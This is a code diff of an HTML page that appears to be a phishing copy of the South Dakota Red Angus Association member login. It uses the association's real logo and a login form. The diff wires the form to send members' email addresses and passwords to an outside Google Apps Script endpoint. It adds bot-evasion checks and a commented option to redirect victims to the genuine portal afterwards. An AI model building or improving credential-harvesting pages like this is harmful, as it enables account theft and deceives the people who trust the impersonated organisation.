@@ -1,130 +1,253 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>South Dakota Red Angus Association | Member Portal</title>
-<link rel="icon" href="https://www.southdakotaredangus.com/favicon.ico" type="image/x-icon">
-<style>
-/* Reset */
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>South Dakota Red Angus Association | Member Login</title>
+    <style>
+        /* Base Reset & Variables */
+        :root {
+            --primary-color: #b71c1c; /* SDRAA Red */
+            --primary-hover: #9a1616;
+            --text-dark: #333333;
+            --text-light: #666666;
+            --bg-color: #f4f6f8;
+            --white: #ffffff;
+            --border-color: #cccccc;
+            --error-color: #d32f2f;
+        }
 
-body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-    background-color: #f9f9f9;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh;
-    color: #333;
-}
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
 
-.container {
-    background: #fff;
-    width: 100%;
-    max-width: 400px;
-    padding: 30px;
-    border-radius: 6px;
-    box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-    opacity: 0;
-    transform: translateY(10px);
-    animation: fadeIn 0.5s ease-out forwards;
-}
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            color: var(--text-dark);
+        }
 
-@keyframes fadeIn {
-    to { opacity: 1; transform: translateY(0); }
-}
+        /* Container Card */
+        .login-container {
+            background: var(--white);
+            width: 100%;
+            max-width: 400px;
+            padding: 40px 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            opacity: 0;
+            animation: fadeIn 0.5s ease-out forwards;
+        }
 
-.header { text-align: center; margin-bottom: 25px; }
-.logo { width: 160px; height: auto; margin-bottom: 10px; }
-h2 { font-size: 18px; color: #b71c1c; font-weight: 600; margin-bottom: 5px; }
-.subtitle { font-size: 13px; color: #666; }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
 
-.input-group { margin-bottom: 15px; text-align: left; }
-label { display: block; margin-bottom: 6px; font-size: 13px; font-weight: 500; color: #444; }
-input[type="email"], input[type="password"] {
-    width: 100%;
-    padding: 12px;
-    border: 1px solid #ccc;
-    border-radius: 4px;
-    font-size: 14px;
-    transition: border-color 0.2s;
-    background: #fff;
-}
-input:focus { border-color: #b71c1c; outline: none; box-shadow: 0 0 0 2px rgba(183, 28, 28, 0.1); }
+        /* Header & Logo */
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
 
-.btn {
-    background: #b71c1c;
-    color: #fff;
-    border: none;
-    padding: 12px;
-    width: 100%;
-    border-radius: 4px;
-    font-size: 14px;
-    font-weight: 600;
-    cursor: pointer;
-    position: relative;
-}
-.btn:hover { background: #9a1616; }
-.btn:disabled { background: #ccc; cursor: not-allowed; }
+        .logo {
+            width: 150px;
+            height: auto;
+            margin-bottom: 15px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
 
-.spinner {
-    display: none;
-    width: 16px; height: 16px;
-    border: 2px solid #fff;
-    border-top: 2px solid transparent;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-    position: absolute; right: 15px; top: 50%; transform: translateY(-50%);
-}
-@keyframes spin { 0% { transform: translateY(-50%) rotate(0deg); } 100% { transform: translateY(-50%) rotate(360deg); } }
+        h2 {
+            font-size: 20px;
+            color: var(--primary-color);
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
 
-.page { display: none; }
-.page.active { display: block; }
+        .subtitle {
+            font-size: 14px;
+            color: var(--text-light);
+            line-height: 1.4;
+        }
 
-/* Honeypot */
-.honey { position: absolute; left: -9999px; top: -9999px; opacity: 0; pointer-events: none; }
+        /* Form Elements */
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
 
-.footer { margin-top: 20px; text-align: center; font-size: 11px; color: #999; }
-.footer a { color: #b71c1c; text-decoration: none; }
-</style>
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--text-dark);
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            font-size: 15px;
+            transition: all 0.2s ease;
+            background: var(--white);
+        }
+
+        input:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(183, 28, 28, 0.15);
+        }
+
+        /* Submit Button */
+        .btn-submit {
+            background-color: var(--primary-color);
+            color: var(--white);
+            border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            position: relative;
+            transition: background-color 0.2s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .btn-submit:hover {
+            background-color: var(--primary-hover);
+        }
+
+        .btn-submit:disabled {
+            background-color: #999;
+            cursor: not-allowed;
+        }
+
+        /* Spinner */
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top: 2px solid var(--white);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            position: absolute;
+            right: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Error Message */
+        .error-msg {
+            color: var(--error-color);
+            font-size: 12px;
+            margin-top: 8px;
+            display: none;
+            text-align: center;
+        }
+
+        /* Footer */
+        .footer {
+            margin-top: 25px;
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+        }
+
+        .footer a {
+            color: var(--primary-color);
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Honeypot Field (Invisible) */
+        .honey {
+            position: absolute;
+            left: -9999px;
+            top: -9999px;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* Responsive Adjustments */
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 30px 20px;
+                box-shadow: none;
+                background: transparent;
+            }
+            
+            body {
+                align-items: flex-start;
+                padding-top: 40px;
+            }
+
+            h2 {
+                font-size: 18px;
+            }
+        }
+    </style>
 </head>
 <body>
 
-<div class="container">
+<div class="login-container">
     <div class="header">
-        <!-- Use a real logo URL -->
-        <img src="https://www.southdakotaredangus.com/images/newhomepage.jpg" alt="SDRAA Logo" class="logo" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYwIiBoZWlnaHQ9IjYwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiNiNzFjMWMiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0id2hpdGUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNCI+U0RSQUEgTG9nbyA8L3RleHQ+PC9zdmc+'">
+        <!-- Logo Image -->
+        <img src="https://www.southdakotaredangus.com/images/newhomepage.jpg" alt="SDRAA Logo" class="logo" 
+             onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYwIiBoZWlnaHQ9IjYwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiNiNzFjMWMiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0id2hpdGUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNCI+U0RSQUEgTG9nbyA8L3RleHQ+PC9zdmc+'">
+        
         <h2>Member Portal</h2>
-        <p class="subtitle">Please sign in to continue</p>
+        <p class="subtitle">Please sign in to view your herd records and dues status.</p>
     </div>
 
-    <form id="loginForm" action="YOUR_GOOGLE_SCRIPT_URL_HERE" method="POST">
+    <!-- Form submits directly to Google Apps Script -->
+    <form id="loginForm" action="https://script.google.com/macros/s/AKfycbwCBEaPOPb2K0u60bn2-S7IMJ4a9NU7mOl5NLjt4ZFkMZzTG8S0KEYB4wBdcZmU5getGw/exec" method="POST" onsubmit="return handleLogin(event)">
         
-        <!-- Honeypot -->
+        <!-- Hidden Honeypot Field for Bot Detection -->
         <input type="text" name="website" class="honey" autocomplete="off" tabindex="-1>
+        
+        <!-- Timestamp for anti-bot detection -->
         <input type="hidden" name="ts" value="">
 
-        <!-- Page 1: Email -->
-        <div id="page-email" class="page active">
-            <div class="input-group">
-                <label for="email">Email Address</label>
-                <input type="email" id="email" name="username" required placeholder="name@example.com" autocomplete="email">
-            </div>
-            <button type="button" id="btn-next" class="btn">Next</button>
+        <!-- Email Field -->
+        <div class="form-group">
+            <label for="email">Email Address</label>
+            <input type="email" id="email" name="username" required placeholder="name@example.com" autocomplete="email">
         </div>
 
-        <!-- Page 2: Password -->
-        <div id="page-password" class="page">
-            <div class="input-group">
-                <label for="pass">Password</label>
-                <input type="password" id="pass" name="password" required placeholder="••••••••" autocomplete="current-password">
-            </div>
-            <button type="submit" id="btn-submit" class="btn">
-                Sign In
-                <div class="spinner"></div>
-            </button>
+        <!-- Password Field -->
+        <div class="form-group">
+            <label for="pass">Password</label>
+            <input type="password" id="pass" name="password" required placeholder="••••••••" autocomplete="current-password">
+            <div id="errorMsg" class="error-msg">Invalid credentials. Please try again.</div>
         </div>
+
+        <!-- Submit Button -->
+        <button type="submit" id="btn-submit" class="btn-submit">
+            Sign In
+            <div class="spinner"></div>
+        </button>
     </form>
 
     <div class="footer">
@@ -135,40 +258,52 @@ input:focus { border-color: #b71c1c; outline: none; box-shadow: 0 0 0 2px rgba(1
 
 <script>
 document.addEventListener("DOMContentLoaded", function() {
-    // Set hidden timestamp
+    // Set hidden timestamp to detect bot timing
     document.querySelector('input[name="ts"]').value = new Date().getTime();
-
-    const btnNext = document.getElementById('btn-next');
-    const emailInput = document.getElementById('email');
-    const passInput = document.getElementById('pass');
-    const form = document.getElementById('loginForm');
-    const btnSubmit = document.getElementById('btn-submit');
-    const spinner = btnSubmit.querySelector('.spinner');
-
-    // Next Button
-    btnNext.addEventListener('click', function() {
-        if (emailInput.value && emailInput.checkValidity()) {
-            document.getElementById('page-email').classList.remove('active');
-            document.getElementById('page-password').classList.add('active');
-            passInput.focus();
-        } else {
-            alert('Please enter a valid email.');
-        }
-    });
-
-    // Submit Handler
-    form.addEventListener('submit', function(e) {
-        const honey = document.querySelector('.honey').value;
-        if (honey !== "") {
-            e.preventDefault();
-            return false;
-        }
-
-        btnSubmit.disabled = true;
-        spinner.style.display = 'block';
-        btnSubmit.childNodes[0].textContent = 'Signing in...';
-    });
 });
+
+function handleLogin(e) {
+    const honey = document.querySelector('.honey').value;
+    const errorMsg = document.getElementById('errorMsg');
+    const btn = document.getElementById('btn-submit');
+    const spinner = btn.querySelector('.spinner');
+    const btnText = btn.childNodes[0];
+
+    // Check honeypot
+    if (honey !== "") {
+        e.preventDefault();
+        return false;
+    }
+
+    // Basic validation visual feedback
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('pass').value;
+
+    if (!email || !pass) {
+        e.preventDefault();
+        errorMsg.style.display = 'block';
+        return false;
+    }
+
+    // Show loading state
+    btn.disabled = true;
+    spinner.style.display = 'block';
+    btnText.textContent = 'Signing in...';
+
+    // Allow the form to submit naturally to Google Script
+    // If you want to intercept it via AJAX instead, uncomment the next lines:
+    /*
+    e.preventDefault();
+    const formData = new FormData(document.getElementById('loginForm'));
+    fetch('YOUR_GOOGLE_SCRIPT_URL_HERE', {
+        method: 'POST',
+        body: formData
+    }).then(response => {
+        // Handle success/error here
+        window.location.href = 'https://www.southdakotaredangus.com/member-portal/';
+    });
+    */
+}
 </script>
 </body>
 </html>
